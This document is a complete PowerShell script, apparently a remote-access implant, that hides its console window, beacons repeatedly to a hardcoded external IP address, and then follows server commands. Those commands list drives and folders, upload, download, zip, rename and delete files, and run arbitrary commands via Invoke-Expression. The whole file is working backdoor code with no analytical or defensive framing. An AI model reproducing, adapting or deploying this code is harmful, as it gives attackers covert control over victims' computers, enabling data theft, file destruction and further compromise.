
Function RemoteFileManager
{
    Add-Type -TypeDefinition @"
    using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

    [Flags]
    public enum _OP_CODE : ushort
    {
	    OP_UNIQ_ID		 =	0x401,
	    OP_REQ_DRIVE_LIST    =	0x402,
	    OP_RES_DRIVE_LIST    =	0x403,
	    OP_REQ_PATH_LIST     =	0x404,
	    OP_RES_PATH_LIST     =	0x405,
	    OP_REQ_PATH_DOWNLOAD =	0x406,
	    OP_RES_PATH_DOWNLOAD =	0x407,
	    OP_REQ_PATH_DELETE   =	0x408,
	    OP_RES_PATH_DELETE   =	0x409,
	    OP_REQ_FILE_UPLOAD   =	0x40A,
	    OP_RES_FILE_UPLOAD   =	0x40B,
	    OP_REQ_PATH_RENAME   =	0x40C,
	    OP_RES_PATH_RENAME   =	0x40D,
	    OP_REQ_CREATE_DIR    =  0x40E,
	    OP_RES_CREATE_DIR    =  0x40F,
	    OP_REQ_RESTART       =  0x410,
	    OP_REQ_CLOSE         =  0x411,
	    OP_REQ_REMOVE        =  0x412,
	    OP_RES_DRIVE_ERROR	= 0x413,
	    OP_REQ_EXECUTE	= 0x414,
	    OP_RES_EXECUTE	= 0x415,
	    OP_REQ_CREATE_ZIP	= 0x416,
	    OP_RES_CREATE_ZIP	= 0x417
    }

"@

    $signatures = @'
	[DllImport("kernel32.dll")]
	public static extern UInt32 GetTickCount();

	[DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

	$consolePtr = $API::GetConsoleWindow()

	if ($consolePtr -ne [IntPtr]::Zero) {
	    $API::ShowWindow($consolePtr, 0)
	}


    Function GetIpv4Address
    {
        $IPv4Address = [String]::Empty;
        $ComputerName = $env:COMPUTERNAME;
        try
        {
            # Get IP from Hostname (IPv4 only)
            $AddressList = @(([System.Net.Dns]::GetHostEntry($ComputerName)).AddressList)
            foreach($Address in $AddressList)
            {
                if($Address.AddressFamily -eq "InterNetwork") 
                {					
                    $IPv4Address = $Address.IPAddressToString;
                    break;					
                }
            }					
        }
        catch
        {
            if([String]::IsNullOrEmpty($IPv4Address))
            {
                return $false;
            }
        }
        return $IPv4Address;   
    }

    Function GetMacAddress
    {
        
        return "AAA";
    }

    Function RemoveHyphen
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [String] $StrIn
        )
        $StrOut = "";
        for($i = 0; $i -lt $StrIn.Length; $i++)
        {
            if($StrIn[$i] -ne '-')
            {
                $StrOut += $StrIn[$i];
            }
        }
        return $StrOut;
    }

    Function BuildPacket
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [uint16] $OpCode,
            [Parameter(Position = 1, Mandatory = $True)]
            [Byte[]] $Data
        )
        [uint32]$EncDataLen = 4 + 2 + 4 + $Data.Length;
        $Packet = New-Object System.Byte[] $EncDataLen;
	[Array]::Copy([BitConverter]::GetBytes($EncDataLen-4), 0, $Packet, 0, 4);
        [Array]::Copy([BitConverter]::GetBytes($OpCode),      0, $Packet, 4, 2);
        [Array]::Copy([BitConverter]::GetBytes($Data.Length), 0, $Packet, 6, 4);
        [Array]::Copy($Data,                                  0, $Packet, 10, $Data.Length);

        return $Packet;
    }
    
    Function ProcessDriveList
    {
        [uint32] $DriveCount = 0;
        [uint16] $OpCode = 0; 
        [Byte[]] $Data = $null;

        try
        {
            $AllDrives = [System.IO.DriveInfo]::GetDrives();
            foreach($drive in $AllDrives)
            {
                if($drive.IsReady)
                {
                    $DriveCount++;
                }
            }
            if($DriveCount -eq 0)
            {
                $Data = [System.Text.Encoding]::UTF8.GetBytes("GetDrives No Drives!");
                $OpCode = [_OP_CODE]::OP_RES_DRIVE_ERROR;
            }
            else
            {
                $DisplayName   = New-Object System.String[] $DriveCount;
                $RootDirectory = New-Object System.String[] $DriveCount;

                $DataLen = 4;
                $i = 0;
                foreach($drive in $AllDrives)
                {
                    if($drive.IsReady)
                    {                    
                        $DisplayName[$i]   = '{0}({1})[{2},{3}]' -f $drive.Name, $drive.VolumeLabel, $drive.DriveType, $drive.DriveFormat;
                        $RootDirectory[$i] = $drive.Name;
                        #$DataLen += (4 + $DisplayName[$i].Length + 1 + $RootDirectory[$i].Length);
                        $DataLen += (4 + [System.Text.Encoding]::UTF8.GetBytes($DisplayName[$i] + ';' + $RootDirectory[$i]).Count);
                        $i++;
                    }
                }
                $Data = New-Object System.Byte[] $DataLen;
                [Array]::Copy([System.BitConverter]::GetBytes($DriveCount), 0, $Data, 0, 4);

                $ptr = 4;
                for($ii = 0; $ii -lt $DriveCount; $ii++)
                {
                    [Byte[]] $ByInfo = [System.Text.Encoding]::UTF8.GetBytes($DisplayName[$ii] + ';' + $RootDirectory[$ii]);
                    [uint32] $InfoLen = $ByInfo.Length;
        
                    $res = [Array]::Copy([System.BitConverter]::GetBytes($InfoLen), 0, $Data, $ptr, 4);
                    $ptr += 4;
                    $res = [Array]::Copy($ByInfo, 0, $Data, $ptr, $InfoLen);
                    $ptr += $InfoLen;
                }
                $OpCode = [_OP_CODE]::OP_RES_DRIVE_LIST;
            }
        }
        catch
        {
            $OpCode = [_OP_CODE]::OP_RES_DRIVE_ERROR;
            switch($Error[0].FullyQualifiedErrorId)
            {
                'UnauthorizedAccessException'
                {
                    $Data = [System.Text.Encoding]::UTF8.GetBytes("GetDrives No Permission!");
                }
                'IOException'
                {
                    $Data = [System.Text.Encoding]::UTF8.GetBytes("GetDrives I/O Error!");
                }
            }        
        }
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }
    
    Function ProcessPathList
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        [uint32] $DirPathLen = [System.BitConverter]::ToInt32($RecvData, 0);
        [String] $DirPath = [System.Text.Encoding]::UTF8.GetString($RecvData, 4, $DirPathLen);
        
        [uint32] $ErrorCode = 0;
        try
        {
            $DirInfoObj  = New-Object System.IO.DirectoryInfo $DirPath;
            $AllDirectories = $DirInfoObj.GetDirectories();
            $AllFiles       = $DirInfoObj.GetFiles();
            $ErrorCode = 0;
        }
        catch
        {       
            $ErrorCode = $Error[0].GetHashCode();
        }

        [uint32] $Count = $AllDirectories.Length + $AllFiles.Length;
        [uint32] $DataLen = $RecvDataLen + 8;
        $InfoArray  = New-Object String[] $Count;

        $i = 0;
        if($AllDirectories.Length -ne 0)
        {
            foreach($dir in $AllDirectories)
            {
                $InfoArray[$i] = "0;" + $dir.Name + ";"+";" + $dir.LastWriteTime;
                $DataLen += (4 + ([System.Text.Encoding]::UTF8.GetBytes($InfoArray[$i])).Length);
                $i++;    
            }
        }

        if($AllFiles.Length -ne 0)
        {
            foreach($file in $AllFiles)
            {
                $InfoArray[$i] = "1;" + $file.Name + ";" + $file.Length + ";" + $file.LastWriteTime;
                $DataLen += (4 + ([System.Text.Encoding]::UTF8.GetBytes($InfoArray[$i])).Length);
                $i++;
            }
        }
        
        $Data = New-Object Byte[] $DataLen;
        $ptr = 0;
        [Array]::Copy($RecvData, 0, $Data, $ptr, $RecvDataLen);
        $ptr += $RecvDataLen;
        [Array]::Copy([BitConverter]::GetBytes($Count), 0, $Data, $ptr, 4);
        $ptr += 4;

        for($ii = 0; $ii -lt $Count; $ii++)
        {
            [Byte[]] $ByInfo= [System.Text.Encoding]::UTF8.GetBytes($InfoArray[$ii]);
            [uint32] $InfoLen = $ByInfo.Length;
            [Array]::Copy([BitConverter]::GetBytes($InfoLen), 0, $Data, $ptr, 4);
            $ptr += 4;
            [Array]::Copy($ByInfo, 0, $Data, $ptr, $InfoLen);
            $ptr += $InfoLen;
        }
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, $ptr, 4);

        $OpCode = [_OP_CODE]::OP_RES_PATH_LIST;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }

    Function ProcessPathDelete
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        [uint32] $PathLen = [System.BitConverter]::ToInt32($RecvData, 0);
        [String] $Path = [System.Text.Encoding]::UTF8.GetString($RecvData, 4, $PathLen);
        [uint32] $IsDir = [System.BitConverter]::ToInt32($RecvData, 4 + $PathLen);

        $Data = New-Object Byte[] ($RecvDataLen + 4);
        [uint32] $ErrorCode = 0;
        try
        {
            if($IsDir -eq 1)
            {
                [System.IO.Directory]::Delete($Path, $True);
            }
            elseif($IsDir -eq 0)
            {
                [System.IO.File]::Delete($Path);
            }
            $ErrorCode = 0;
        }
        catch
        {
              $ErrorCode = $Error[0].GetHashCode();
        }
        [Array]::Copy($RecvData,                            0, $Data, 0,            $RecvDataLen);
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, $RecvDataLen, 4);

        [uint16] $OpCode = [_OP_CODE]::OP_RES_PATH_DELETE;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }

    Function ProcessPathZip
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        [uint32] $PathLen = [System.BitConverter]::ToInt32($RecvData, 0);
        [String] $Path = [System.Text.Encoding]::UTF8.GetString($RecvData, 4, $PathLen);
        [uint32] $IsDir = [System.BitConverter]::ToInt32($RecvData, 4 + $PathLen);

        $Data = New-Object Byte[] ($RecvDataLen + 4);
	    
        [uint32] $ErrorCode = 0;
        try
        {
            if($IsDir -eq 1)
            {
		$ArchiveFileName = $Path + '.zip';
                Compress-Archive $ArchiveFileName -LiteralPath $Path;
            }
            elseif($IsDir -eq 0)
            {
	    	$subpath = Split-Path $Path -Parent
	    	$ArchiveFileName = $subpath + '\' + [system.io.path]::GetFileNameWithoutExtension($Path) + '.zip';
		        Compress-Archive -Path $Path -DestinationPath $ArchiveFileName;   
            }
            $ErrorCode = 0;
        }
        catch
        {
              $ErrorCode = $Error[0].GetHashCode();
        }
        [Array]::Copy($RecvData,                            0, $Data, 0,            $RecvDataLen);
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, $RecvDataLen, 4);

        [uint16] $OpCode = [_OP_CODE]::OP_REQ_CREATE_ZIP;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }

    Function ProcessPathExecute
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        [uint32] $PathLen = [System.BitConverter]::ToInt32($RecvData, 0);
        [String] $Path = [System.Text.Encoding]::UTF8.GetString($RecvData, 4, $PathLen);
        [uint32] $IsDir = [System.BitConverter]::ToInt32($RecvData, 4 + $PathLen);

        $Data = New-Object Byte[] ($RecvDataLen + 4);
        [uint32] $ErrorCode = 0;
        try
        {
            if($IsDir -eq 1)
            {
	    	Invoke-Expression "$Path"
            }
            elseif($IsDir -eq 0)
            {
                Invoke-Expression "$Path"
            }
            $ErrorCode = 0;
        }
        catch
        {
              $ErrorCode = $Error[0].GetHashCode();
        }
        [Array]::Copy($RecvData,                            0, $Data, 0,            $RecvDataLen);
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, $RecvDataLen, 4);

        [uint16] $OpCode = [_OP_CODE]::OP_REQ_EXECUTE;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }

    Function ProcessPathRename
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        $ptr = 0;
        [uint32] $SrcPathLen = [System.BitConverter]::ToInt32($RecvData, $ptr);
        $ptr += 4;
        [String] $SrcPath    = [System.Text.Encoding]::UTF8.GetString($RecvData, $ptr, $SrcPathLen);
        $ptr += $SrcPathLen;
        [uint32] $DstPathLen = [System.BitConverter]::ToInt32($RecvData, $ptr);
        $ptr += 4;
        [String] $DstPath    = [System.Text.Encoding]::UTF8.GetString($RecvData, $ptr, $DstPathLen);
        $ptr += $DstPathLen;
        [uint32] $IsDir      = [System.BitConverter]::ToInt32($RecvData, $ptr);
 
        $Data = New-Object Byte[] ($RecvDataLen + 4);
        [uint32] $ErrorCode = 0;
        try
        {
            if($IsDir -eq 1)
            {
                [System.IO.Directory]::Move($SrcPath, $DstPath);
            }
            else
            {
                [System.IO.File]::Move($SrcPath, $DstPath);
            }
            $ErrorCode = 0;
        }
        catch
        {
              $ErrorCode = $Error[0].GetHashCode();
        }
        [Array]::Copy($RecvData,                            0, $Data, 0,            $RecvDataLen);
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, $RecvDataLen, 4);

        [uint16] $OpCode = [_OP_CODE]::OP_RES_PATH_RENAME;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet;
    }

    Function ProcessCreateDir
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [Byte[]] $RecvData,
        
            [Parameter(Position = 1, Mandatory = $True)]
            [uint32] $RecvDataLen
        )
        [uint32] $PathLen = [System.BitConverter]::ToInt32($RecvData, 0);
        [String] $Path = [System.Text.Encoding]::UTF8.GetString($RecvData, 4, $PathLen);
        [uint32] $ErrorCode = 0;

        $Data = New-Object Byte[] ($RecvDataLen + 4);
        try
        {
            if([System.IO.Directory]::Exists($Path) -eq $True)
            {
                $Path += "(2)";
            }
            $Dir = [System.IO.Directory]::CreateDirectory($Path);
        }
        catch
        {
            $ErrorCode = $Error[0].GetHashCode();
        }
        [Array]::Copy([BitConverter]::GetBytes($Path.Length),       0, $Data, 0,            4);
        [Array]::Copy([System.Text.Encoding]::UTF8.GetBytes($Path), 0, $Data, 4,            $Path.Length);
        [Array]::Copy([BitConverter]::GetBytes($ErrorCode),         0, $Data, $Path.Length, 4);

        [uint16] $OpCode = [_OP_CODE]::OP_RES_CREATE_DIR;
        $Packet = BuildPacket -OpCode $OpCode -Data $Data;
        return $Packet; 
    }

    Function CommunicationWithServer
    {
        [CmdletBinding()]
        Param (
            [Parameter(Position = 0, Mandatory = $True)]
            [String] $StrIp,
            [Parameter(Position = 1, Mandatory = $True)]
            [uint16] $UPort
        )
        $Ip = [System.Net.Dns]::GetHostAddresses($strIp);
        $Address = [System.Net.IPAddress]::Parse($Ip);

        while($True)
        {
            try {
                $Socket = New-Object System.Net.Sockets.TcpClient($Address, $UPort);
                if($Socket.Connected) {
                    break;
                }
            }
            catch {}
            Start-Sleep -Milliseconds 10000;
        }

        $SocketStream = $Socket.GetStream();
    
        #UniqueId Generate
        $HashObject = [Security.Cryptography.HashAlgorithm]::Create("MD5");
        $EncObject = New-Object System.Text.UTF8Encoding;
        $Ipv4Address = GetIpv4Address;
        $MacAddress  = GetMacAddress -Ipv4Address $Ipv4Address;
        $HashValue = $HashObject.ComputeHash($EncObject.GetBytes($MacAddress + $Ipv4Address));
        
        $StrTemp = [System.BitConverter]::ToString($HashValue);
        $StrUniqueId = RemoveHyphen -StrIn $StrTemp;
        $ByUniqueId = $EncObject.GetBytes($StrUniqueId);


        #Send to Server OP_UNIQ_ID Message
        [uint16]$nOpCode       = [_OP_CODE]::OP_UNIQ_ID;        
        [uint32]$nUniqueIdLen  = $ByUniqueId.Length;
        [uint32]$nDataLen      = 4 + $nUniqueIdLen;

        $FirstPacket = New-Object System.Byte[](2 + 4 + $nDataLen);

        [Array]::Copy([BitConverter]::GetBytes($nOpCode),      0, $FirstPacket, 0,  2);
        [Array]::Copy([BitConverter]::GetBytes($nDataLen),     0, $FirstPacket, 2,  4);
        [Array]::Copy([BitConverter]::GetBytes($nUniqueIdLen), 0, $FirstPacket, 6,  4);
        [Array]::Copy($ByUniqueId,                             0, $FirstPacket, 10, $nUniqueIdLen);

        $SocketStream.Write($FirstPacket, 0, $FirstPacket.Length);
        Start-Sleep -Milliseconds 10;
    
        #Recieve Packets from Server and Send to Server Result.
        $ReadBuffer = New-Object Byte[] 4196;
        $ContinueFlag = $True;
        $ping_send = New-Object Byte[] 1;
        $Tick = 0;
        While($ContinueFlag)
        {
            Start-Sleep -Milliseconds 1;
            if( ($Tick -eq 0) -or ($API::GetTickCount() - $Tick -gt 1000) ) {
                try {
                    $send_result = $Socket.Client.Send($ping_send);
                    if( $send_result -eq 0 ) {
                        Write-Host "Disconnected from Server[1]!!!";
                        $ContinueFlag = $false;
                    }
                } catch [Exception] {
                    Write-Host "Disconnected from Server[0]!!!";
                    $ContinueFlag = $false;
                }

                $Tick = $API::GetTickCount();
            }

            while($SocketStream.DataAvailable)
            {
	    	$DownFlag = $True;
                #EncDataLen(4)
                $ReadBytes = $SocketStream.Read($ReadBuffer, 0, 4);
                [uint32]$EncDataLen = [BitConverter]::ToInt32($ReadBuffer, 0); 

                #OPCODE(2), DataLen(4)
                $ReadBytes = $SocketStream.Read($ReadBuffer, 0, 6); 
                

                [uint16]$OpCode  = [BitConverter]::ToInt16($ReadBuffer, 0);
                [uint32]$DataLen = [BitConverter]::ToInt32($ReadBuffer, 2);

                if($OpCode -ne [_OP_CODE]::OP_REQ_FILE_UPLOAD)
                {
                    $ReadBytes = $SocketStream.Read($ReadBuffer, 0, $DataLen);
                }
                # Generate the Response Packet about the Request Packet and Send a Packet.
                [Byte[]] $Packet = $null;
                if($OpCode -eq [_OP_CODE]::OP_REQ_DRIVE_LIST)
                {
                    $Packet = ProcessDriveList -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_PATH_LIST)
                {
                    $Packet = ProcessPathList -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_PATH_DELETE)
                {
                    $Packet = ProcessPathDelete -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
		        elseif($OpCode -eq [_OP_CODE]::OP_REQ_EXECUTE)
                {
                    $Packet = ProcessPathExecute -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
		        elseif($OpCode -eq [_OP_CODE]::OP_REQ_CREATE_ZIP)
                {
                    $Packet = ProcessPathZip -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_PATH_RENAME)
                {
                    $Packet = ProcessPathRename -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_CREATE_DIR)
                {
                    $Packet = ProcessCreateDir -RecvData $ReadBuffer -RecvDataLen $DataLen;
                }    
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_PATH_DOWNLOAD)
                {
			[uint32] $PathLen = [BitConverter]::ToInt32($ReadBuffer, 0);
			[String] $Path    = [Text.Encoding]::UTF8.GetString($ReadBuffer, 4, $PathLen);
			[uint32] $IsDir   = [BitConverter]::ToInt32($ReadBuffer, 4 + $PathLen);
			$Exist = 0;
			$ArchiveFileName = $Path;
			if($IsDir -eq 1)
			{
			    $Exist = [System.IO.Directory]::Exists($Path);
			    if($Exist)
			    {
				$ArchiveFileName += ".zip";
				Compress-Archive $ArchiveFileName -LiteralPath $Path;
			    }				
			}
			else
			{
			    $Exist = [System.IO.File]::Exists($Path);
			}
			if($Exist)
			{
				$num = 1;
				$streamSize = 1MB;
				$rawBytes = New-Object byte[] $streamSize;
				[uint32]$EncDataLen = 4 + 2 + 4 + 8 + 256 + $streamSize;
				$Packetdown = New-Object System.Byte[] $EncDataLen;
				[uint16] $OpCode = [_OP_CODE]::OP_RES_PATH_DOWNLOAD;
				$file = [IO.File]::OpenRead($ArchiveFileName);
				while(($read = $file.Read($rawBytes, 0, $streamSize)) -gt 0)
				{
					$wPath = $ArchiveFileName;
					$pathname = [String]::Empty;
					[Byte[]] $pathbytes = $null;
					$tmplen = 0;
					$pos = $file.Length - ($num - 1) * $streamSize

					if($file.Length -le $streamSize)
					{
						$pos = $file.Length;
						$pathname = Split-Path $wPath -Leaf;
						$pathbytes = [System.Text.Encoding]::UTF8.GetBytes($pathname);
						$EncDataLen = 4 + 2 + 4 + 8 + $pathbytes.Length + $pos;
						$tmplen = 8 + $pathbytes.Length + $pos;

					}
					else
					{
						$wPath += "." + $num.Tostring("000");
						$pathname = Split-Path $wPath -Leaf;
						$pathbytes = [System.Text.Encoding]::UTF8.GetBytes($pathname);

						if ($pos -lt $streamSize)
						{
							$EncDataLen = 4 + 2 + 4 + 8 + $pathbytes.Length + $pos;
							$tmplen = 8 + $pathbytes.Length + $pos;
						}
						else
						{

							$EncDataLen = 4 + 2 + 4 + 8 + $pathbytes.Length + $streamSize;
							$tmplen = 8 + $pathbytes.Length + $streamSize;
							$pos = $streamSize;
						}
					}
				
					[Array]::Copy([BitConverter]::GetBytes($EncDataLen-4), 0, $Packetdown, 0, 4);
					[Array]::Copy([BitConverter]::GetBytes($OpCode),      0, $Packetdown, 4, 2);
					[Array]::Copy([BitConverter]::GetBytes($tmplen),  0,		$Packetdown, 6, 4);
					[Array]::Copy([BitConverter]::GetBytes($pathbytes.Length),  0,		$Packetdown, 10, 4);
					[Array]::Copy([BitConverter]::GetBytes($pos),  0,		$Packetdown, 14, 4);
					[Array]::Copy($pathbytes, 0, $Packetdown, 18, $pathbytes.Length);
					[Array]::Copy($rawBytes,  0, $Packetdown, 18 + $pathbytes.Length, $pos);	

					$SocketStream.Write($Packetdown, 0, $EncDataLen);
					Start-Sleep -Seconds 1;

					 [GC]::Collect();
					 $num++
				}
				$file.Close();
			}
			$DownFlag = $False;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_CLOSE)
                {
                    Write-Host "OP_REQ_CLOSE";
                    $SocketStream.Close();
                    $Socket.Close();
                    return $false;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_REMOVE)
                {
                    Write-Host "OP_REQ_REMOVE";
                    $SocketStream.Close();
                    $Socket.Close();
                    return $false;
                }
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_RESTART)
                {
                    $SocketStream.Close();
                    $Socket.Close();
                    CommunicationWithServer -StrIp $StrIP -UPort $UPort;
                } 
                elseif($OpCode -eq [_OP_CODE]::OP_REQ_FILE_UPLOAD)
                {
                    $ErrorCode = 1;
                    $ReadBytes = $SocketStream.Read($ReadBuffer, 0, 4196);
                    $FilePathLen = [BitConverter]::ToInt32($ReadBuffer, 0);
                    $FilePath = [Text.Encoding]::UTF8.GetString($ReadBuffer, 4, $FilePathLen);
                    $FileDataLen = [BitConverter]::ToInt32($ReadBuffer, 4 + $FilePathLen);
                    
                    $FileStream = [System.IO.File]::OpenWrite($FilePath);
                    $FileStream.Position = 0;
                    $FileStream.Write($ReadBuffer, 8 + $FilePathLen, $ReadBytes - (8 + $FilePathLen));

                    $TotalLen = $ReadBytes;
                    while($TotalLen -lt $DataLen)
                    {
                        $ReadBytes = $SocketStream.Read($ReadBuffer, 0, 4196);
                        $FileStream.Write($ReadBuffer, 0, $ReadBytes);
                        $TotalLen += $ReadBytes;
                    }
                    $FileStream.Close();

                    $ErrorCode = 0;
                    $Data = New-Object Byte[] (8 + $FilePathLen);
                    [Array]::Copy([BitConverter]::GetBytes($FilePathLen), 0, $Data, 0, 4);
                    [Array]::Copy([Text.Encoding]::UTF8.GetBytes($FilePath), 0, $Data, 4, $FilePathLen);
                    [Array]::Copy([BitConverter]::GetBytes($ErrorCode), 0, $Data, 4 + $FilePathLen, 4);

                    [uint16] $OpCode = [_OP_CODE]::OP_RES_FILE_UPLOAD;
                    $Packet = BuildPacket -OpCode $OpCode -Data $Data;
                } 
                else {
                    continue;
                }

                if( $ContinueFlag ) 
				{
					if( $DownFlag)
					{
						$SocketStream.Write($Packet, 0, $Packet.Length);
					}
                }
            }
        }
    }   

    while( $true ) {
        $fContinue = CommunicationWithServer -StrIp "38.180.158.60" -UPort 14275;
        if( $fContinue -eq $false ) {
            Write-Host "Server requests to close client.";
            break;
        }
        Start-Sleep -Seconds 10;
    }
}  

RemoteFileManager
